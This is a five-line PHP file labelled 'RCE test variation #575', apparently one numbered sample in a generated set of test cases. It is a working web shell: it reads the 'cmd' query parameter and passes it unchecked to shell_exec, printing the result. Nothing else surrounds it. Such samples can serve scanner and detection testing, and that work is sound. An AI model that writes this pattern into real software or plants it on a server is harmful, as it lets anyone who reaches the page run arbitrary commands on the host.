<?php
// RCE test variation #575
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>